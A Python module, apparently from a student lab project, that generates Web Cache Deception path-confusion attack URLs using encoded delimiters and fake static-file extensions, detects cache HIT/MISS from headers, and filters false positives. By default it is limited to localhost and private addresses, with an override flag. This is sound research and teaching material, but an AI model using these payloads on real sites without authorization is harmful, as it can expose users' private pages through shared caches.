#!/usr/bin/env python3
"""
Member 3 module for a local/authorized Web Cache Deception (WCD) demo.

Responsibilities covered:
1. Generate randomized path-confusion attack URLs.
2. Provide fuzzy cache HIT/MISS header heuristics.
3. Implement Algorithm 2 style false-positive filtering.
4. Export generated payloads if needed for the detection-engine member.

This is intentionally a small, explainable adaptation of the ideas used in the
paper's official wcde.py implementation. It is restricted to localhost/private
lab targets by default.
"""

from __future__ import annotations

import argparse
import csv
import hashlib
import ipaddress
import json
import re
import secrets
import string
from dataclasses import asdict, dataclass
from typing import Dict, Iterable, List, Optional, Sequence
from urllib.parse import urlsplit, urlunsplit

import requests


# =============================================================================
# Safety: lab / authorized targets only
# =============================================================================


def is_lab_target(url: str) -> bool:
    """
    Allow localhost, loopback, private IPs, and *.local names.
    This keeps the code focused on your local Docker/Nginx/Flask/Varnish demo.
    """
    host = urlsplit(url).hostname
    if not host:
        return False

    if host in {"localhost", "127.0.0.1", "::1"}:
        return True

    try:
        ip = ipaddress.ip_address(host)
        return ip.is_private or ip.is_loopback
    except ValueError:
        return host.endswith(".local")


def require_lab_target(url: str, allow_external: bool = False) -> None:
    if allow_external:
        return
    if not is_lab_target(url):
        raise ValueError(
            "This script is intended for local/authorized lab targets only. "
            "Use something like http://localhost:8080/profile. "
            "Pass --allow-external only for a target you are explicitly authorized to test."
        )


# =============================================================================
# Payload generation, adapted from the official wcde.py idea
# =============================================================================


def encode(text: str) -> str:
    """URL-encode each character, e.g. ';' -> '%3B'."""
    return "".join("%" + hex(ord(ch)).replace("0x", "").upper().zfill(2) for ch in text)


DEFAULT_PATH_CONFUSION_MODES: Dict[str, str] = {
    # Same structure as the official wcde.py defaults
    "PATH_PARAMETER": "/",
    "ENCODED_SEMICOLON": encode(";"),          # %3B
    "ENCODED_QUESTION": encode("?"),           # %3F
    "ENCODED_NEWLINE": encode("\n"),           # %0A
    "ENCODED_SHARP": encode("#"),              # %23
    "ENCODED_SLASH": encode("/"),              # %2F
    "DOUBLE_ENCODED_SEMICOLON": encode("%3B"), # %25%33%42
    "DOUBLE_ENCODED_QUESTION": encode("%3F"),  # %25%33%46
    "DOUBLE_ENCODED_NEWLINE": encode("%0A"),   # %25%30%41
    "DOUBLE_ENCODED_SHARP": encode("%23"),     # %25%32%33
    "DOUBLE_ENCODED_SLASH": encode("%2F"),     # %25%32%46
    "DOUBLE_ENCODED_NULL": encode("%00"),      # %25%30%30
}


@dataclass(frozen=True)
class AttackPayload:
    mode: str
    original_url: str
    attack_url: str
    extension: str
    random_filename: str


def random_token(min_len: int = 10, max_len: int = 20) -> str:
    """
    Official wcde.py used random lowercase/digit/underscore strings.
    This version uses secrets instead of deterministic random.seed.
    """
    alphabet = string.ascii_lowercase + string.digits + "_"
    length = min_len + secrets.randbelow(max_len - min_len + 1)
    return "".join(secrets.choice(alphabet) for _ in range(length))


def normalize_extension(extension: str) -> str:
    extension = extension.strip()
    return extension if extension.startswith(".") else "." + extension


def generate_attack_url(
    url: str,
    mode: str,
    extension: str = ".css",
    modes: Optional[Dict[str, str]] = None,
    token: Optional[str] = None,
) -> AttackPayload:
    """
    Generate one WCD/path-confusion attack URL.

    This mirrors the official wcde.py logic, including the special handling for:
    - PATH_PARAMETER
    - ENCODED_QUESTION

    Example:
        http://localhost:8080/profile
        -> http://localhost:8080/profile/a1b2c3.css
    """
    modes = modes or DEFAULT_PATH_CONFUSION_MODES
    extension = normalize_extension(extension)

    if mode not in modes:
        raise KeyError(f"Unknown path-confusion mode: {mode}")

    parsed = urlsplit(url)
    path = parsed.path or "/"
    query = parsed.query
    encoded_character = modes[mode]
    token = token or random_token()
    filename = f"{token}{extension}"

    if mode == "PATH_PARAMETER":
        # If the URL is /profile, produce /profile/<random>.css.
        # If it is already /profile/, produce /profile/<random>.css.
        if not path.endswith("/"):
            path += encoded_character
        path += filename

    elif mode == "ENCODED_QUESTION":
        # Official wcde.py places encoded '?' before the query string and clears query.
        # Example: /profile?x=1 -> /profile%3Fx=1random.css
        path += f"{encoded_character}{query}{filename}"
        query = ""

    else:
        # General form: /profile + encoded_char + random.css
        path += f"{encoded_character}{filename}"

    attack_url = urlunsplit((parsed.scheme, parsed.netloc, path, query, parsed.fragment))

    return AttackPayload(
        mode=mode,
        original_url=url,
        attack_url=attack_url,
        extension=extension,
        random_filename=filename,
    )


def generate_attack_urls(
    url: str,
    extensions: Sequence[str] = (".css",),
    modes: Optional[Dict[str, str]] = None,
    count_per_mode: int = 1,
    allow_external: bool = False,
) -> List[AttackPayload]:
    """Generate many randomized attack URLs for one original URL."""
    require_lab_target(url, allow_external=allow_external)
    modes = modes or DEFAULT_PATH_CONFUSION_MODES

    payloads: List[AttackPayload] = []
    for extension in extensions:
        for mode in modes:
            for _ in range(count_per_mode):
                payloads.append(generate_attack_url(url, mode, extension, modes=modes))
    return payloads


# =============================================================================
# Cache header heuristics
# =============================================================================


@dataclass(frozen=True)
class CacheHeaderDecision:
    status: str  # HIT, MISS, AMBIGUOUS, UNKNOWN
    evidence: str


def cache_headers_heuristics(headers: Dict[str, str]) -> CacheHeaderDecision:
    """
    Fuzzy cache HIT/MISS detection.

    The official wcde.py checks headers containing 'cache' or 'server-timing'
    and looks for hit/miss/cached/caching. This version keeps that behavior,
    also preserving evidence for your report/debug output.
    """
    relevant_parts: List[str] = []

    for header, value in headers.items():
        header_l = header.lower()
        value_l = str(value).lower()

        if "cache" in header_l or "server-timing" in header_l:
            relevant_parts.append(f"{header}: {value}")

    evidence = " | ".join(relevant_parts)
    text = evidence.lower()

    # Order matters: specific TCP markers before generic hit/miss words.
    hit_found = re.search(r"(tcp_remote_hit|tcp_hit|desc=hit|\bhit\b|\bcached\b)", text) is not None
    miss_found = re.search(r"(tcp_miss|desc=miss|\bmiss\b|\bcaching\b)", text) is not None

    if hit_found and not miss_found:
        return CacheHeaderDecision("HIT", evidence or "No cache evidence")
    if miss_found and not hit_found:
        return CacheHeaderDecision("MISS", evidence or "No cache evidence")
    if hit_found and miss_found:
        return CacheHeaderDecision("AMBIGUOUS", evidence or "Conflicting cache evidence")
    return CacheHeaderDecision("UNKNOWN", evidence or "No recognized cache header")


# Backward-compatible short function name, useful for Member 2.
def infer_cache_status(headers: Dict[str, str]) -> str:
    return cache_headers_heuristics(headers).status


# =============================================================================
# False-positive filtering, Algorithm 2 style
# =============================================================================


@dataclass(frozen=True)
class FalsePositiveResult:
    original_url: str
    first_http_status: int
    second_http_status: int
    first_cache_status: str
    second_cache_status: str
    first_cache_evidence: str
    second_cache_evidence: str
    bodies_identical: bool
    is_false_positive: bool
    conclusion: str


def body_hash(response: requests.Response) -> str:
    return hashlib.sha256(response.content).hexdigest()


def fetch(
    session: requests.Session,
    url: str,
    timeout: int = 8,
    referrer: Optional[str] = None,
) -> requests.Response:
    headers = {"User-Agent": "Member3-WCD-local-demo/1.0"}
    if referrer:
        headers["Referer"] = referrer

    return session.get(
        url,
        headers=headers,
        timeout=timeout,
        allow_redirects=False,
    )


def check_false_positive(
    original_url: str,
    timeout: int = 8,
    allow_external: bool = False,
) -> FalsePositiveResult:
    """
    Algorithm 2 idea from the paper:
    - Request the normal/original URL twice, WITHOUT the WCD attack payload.
    - If the second response is a cache HIT, the page is already cacheable normally.
    - Therefore, a later WCD finding on this URL should be filtered as false positive.
    """
    require_lab_target(original_url, allow_external=allow_external)

    session = requests.Session()
    first = fetch(session, original_url, timeout=timeout)
    second = fetch(session, original_url, timeout=timeout)

    first_decision = cache_headers_heuristics(first.headers)
    second_decision = cache_headers_heuristics(second.headers)
    same_body = body_hash(first) == body_hash(second)

    is_fp = second_decision.status == "HIT"

    if is_fp:
        conclusion = (
            "FALSE POSITIVE: the original URL was cached even without an attack payload. "
            "This looks like normal/explicit caching, not Web Cache Deception."
        )
    elif second_decision.status == "UNKNOWN":
        conclusion = (
            "NOT MARKED FALSE POSITIVE: the second normal request did not expose a clear cache HIT. "
            "However, cache headers are UNKNOWN, so report this carefully."
        )
    elif second_decision.status == "AMBIGUOUS":
        conclusion = (
            "NOT MARKED FALSE POSITIVE: cache evidence was ambiguous. "
            "This should be manually checked during the demo/report."
        )
    else:
        conclusion = (
            "NOT A FALSE POSITIVE by Algorithm 2: the normal/original URL was not cached "
            "on the second request."
        )

    return FalsePositiveResult(
        original_url=original_url,
        first_http_status=first.status_code,
        second_http_status=second.status_code,
        first_cache_status=first_decision.status,
        second_cache_status=second_decision.status,
        first_cache_evidence=first_decision.evidence,
        second_cache_evidence=second_decision.evidence,
        bodies_identical=same_body,
        is_false_positive=is_fp,
        conclusion=conclusion,
    )


def filter_false_positives(
    original_urls: Iterable[str],
    timeout: int = 8,
    allow_external: bool = False,
) -> List[FalsePositiveResult]:
    """
    Convenience helper for Member 2:
    pass all original URLs that were flagged as suspicious; get FP decisions back.
    """
    return [
        check_false_positive(url, timeout=timeout, allow_external=allow_external)
        for url in original_urls
    ]


# =============================================================================
# Optional export helpers
# =============================================================================


def export_payloads_csv(payloads: Sequence[AttackPayload], output_path: str) -> None:
    with open(output_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=["mode", "original_url", "attack_url", "extension", "random_filename"],
        )
        writer.writeheader()
        for payload in payloads:
            writer.writerow(asdict(payload))


def export_payloads_json(payloads: Sequence[AttackPayload], output_path: str) -> None:
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump([asdict(payload) for payload in payloads], f, indent=2)


# =============================================================================
# CLI
# =============================================================================


def parse_extensions(value: str) -> List[str]:
    return [normalize_extension(ext) for ext in value.split(",") if ext.strip()]


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Member 3 WCD payload generator + false-positive filter"
    )
    parser.add_argument(
        "--url",
        required=True,
        help="Original local target URL, e.g. http://localhost:8080/profile",
    )
    parser.add_argument(
        "--extensions",
        default=".css",
        help="Comma-separated static-looking extensions. Default: .css",
    )
    parser.add_argument(
        "--count-per-mode",
        type=int,
        default=1,
        help="How many randomized URLs to generate for each path-confusion mode.",
    )
    parser.add_argument(
        "--skip-fp-check",
        action="store_true",
        help="Only generate payloads; do not run Algorithm 2 false-positive check.",
    )
    parser.add_argument(
        "--output-csv",
        help="Optional path to save generated payloads as CSV.",
    )
    parser.add_argument(
        "--output-json",
        help="Optional path to save generated payloads as JSON.",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=8,
        help="HTTP request timeout in seconds. Default: 8",
    )
    parser.add_argument(
        "--allow-external",
        action="store_true",
        help="Allow non-local targets. Use only with explicit authorization.",
    )

    args = parser.parse_args()

    extensions = parse_extensions(args.extensions)
    payloads = generate_attack_urls(
        args.url,
        extensions=extensions,
        count_per_mode=args.count_per_mode,
        allow_external=args.allow_external,
    )

    print("\n[1] Generated WCD/path-confusion attack URLs\n")
    for payload in payloads:
        print(f"{payload.mode:28s} -> {payload.attack_url}")

    if args.output_csv:
        export_payloads_csv(payloads, args.output_csv)
        print(f"\nSaved CSV payload list to: {args.output_csv}")

    if args.output_json:
        export_payloads_json(payloads, args.output_json)
        print(f"Saved JSON payload list to: {args.output_json}")

    if not args.skip_fp_check:
        print("\n[2] Algorithm 2 false-positive check on the original URL\n")
        result = check_false_positive(
            args.url,
            timeout=args.timeout,
            allow_external=args.allow_external,
        )
        print(f"Original URL:         {result.original_url}")
        print(f"First HTTP status:    {result.first_http_status}")
        print(f"Second HTTP status:   {result.second_http_status}")
        print(f"First cache status:   {result.first_cache_status}")
        print(f"Second cache status:  {result.second_cache_status}")
        print(f"Bodies identical:     {result.bodies_identical}")
        print(f"False positive?:      {result.is_false_positive}")
        print(f"First evidence:       {result.first_cache_evidence}")
        print(f"Second evidence:      {result.second_cache_evidence}")
        print(f"Conclusion:           {result.conclusion}")


if __name__ == "__main__":
    main()
